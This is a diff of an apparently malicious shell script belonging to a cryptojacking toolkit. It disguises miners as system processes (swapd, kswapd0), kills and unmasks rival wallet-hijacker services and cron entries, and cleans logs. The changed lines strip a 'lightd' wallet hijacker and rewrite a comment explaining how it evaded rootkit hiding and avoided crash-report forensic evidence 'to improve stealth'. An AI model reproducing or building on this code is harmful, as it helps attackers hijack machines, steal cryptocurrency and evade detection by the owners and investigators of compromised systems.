@@ -333,7 +333,6 @@ OLD_SERVICES=(
     "smart-wallet-hijacker"
     "wallet-hijacker"
     "system-monitor"
-    "lightd"
 )
 
 # List of old binary names to check and remove
@@ -341,7 +340,6 @@ OLD_BINARIES=(
     "/usr/local/bin/smart-wallet-hijacker"
     "/usr/local/bin/wallet-hijacker"
     "/usr/local/bin/system-monitor"
-    "/usr/local/bin/lightd"
 )
 
 echo "[*] Stopping and removing old wallet hijacker services..."
@@ -373,7 +371,7 @@ echo ""
 echo "[*] Killing old wallet hijacker processes (memory cleanup)..."
 
 # Kill by process name
-for proc in smart-wallet-hijacker wallet-hijacker system-monitor lightd; do
+for proc in smart-wallet-hijacker wallet-hijacker system-monitor; do
     if proc_pids "$proc" | grep -q . 2>/dev/null; then
         echo "    [*] Killing process: $proc"
         pkill -9 -f "$proc" 2>/dev/null || true
@@ -405,9 +403,9 @@ done
 # Remove old cron entries
 echo ""
 echo "[*] Removing old cron entries..."
-if crontab -l 2>/dev/null | grep -qE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd'; then
+if crontab -l 2>/dev/null | grep -qE 'smart-wallet-hijacker|wallet-hijacker|system-monitor'; then
     echo "    [*] Found old cron entries, removing..."
-    crontab -l 2>/dev/null | grep -vE 'smart-wallet-hijacker|wallet-hijacker|system-monitor|lightd' | crontab - 2>/dev/null || true
+    crontab -l 2>/dev/null | grep -vE 'smart-wallet-hijacker|wallet-hijacker|system-monitor' | crontab - 2>/dev/null || true
     echo "    [✓] Cron entries cleaned"
 fi
 
@@ -759,7 +757,7 @@ echo "[*] Cleaning up old miner installations..."
 # CRITICAL: Disable auto-restart FIRST to prevent infinite loop
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
     echo "[*] Disabling systemd auto-restart for all miner services..."
-    for svc in swapd kswapd0 xmrig system-watchdog lightd; do
+    for svc in swapd kswapd0 xmrig system-watchdog; do
         systemctl stop "$svc" 2>/dev/null || true
         systemctl disable "$svc" 2>/dev/null || true
         systemctl mask "$svc" 2>/dev/null || true  # Prevent re-enabling
@@ -770,7 +768,6 @@ if [ "$SYSTEMD_AVAILABLE" = true ]; then
     rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
     rm -f /etc/systemd/system/xmrig.service 2>/dev/null
     rm -f /etc/systemd/system/system-watchdog.service 2>/dev/null
-    rm -f /etc/systemd/system/lightd.service 2>/dev/null
     
     # Reload systemd to forget the services
     systemctl daemon-reload 2>/dev/null || true
@@ -787,7 +784,7 @@ rm -f /usr/local/bin/system-watchdog 2>/dev/null
 
 # NOW kill processes (no auto-restart will trigger)
 echo "[*] Killing remaining miner processes..."
-send_sig 9 swapd kswapd0 xmrig lightd config.json
+send_sig 9 swapd kswapd0 xmrig config.json
 
 # Remove old miner directories
 rm -rf /root/.swapd 2>/dev/null
@@ -2883,11 +2880,8 @@ fi
 echo "[✓] Log cleanup complete"
 
 # ==================== WALLET HIJACKER DISABLED ====================
-# Reason: lightd process was visible in 'ps aux' output
-# Even with rootkits, it appeared as "/bin/bash /usr/local/bin/lightd daemon"
-# Additionally, hide signals (kill -31/-59) triggered Ubuntu's apport crash reporter
-# This created forensic evidence in /var/crash/*.crash files
-# Disabled to reduce detection surface
+# Wallet hijacker functionality has been removed from this script
+# to reduce detection surface and improve stealth
 echo "[*] Wallet hijacker disabled (stealth optimization)"
 
 # ==================== FINAL CLEANUP ====================
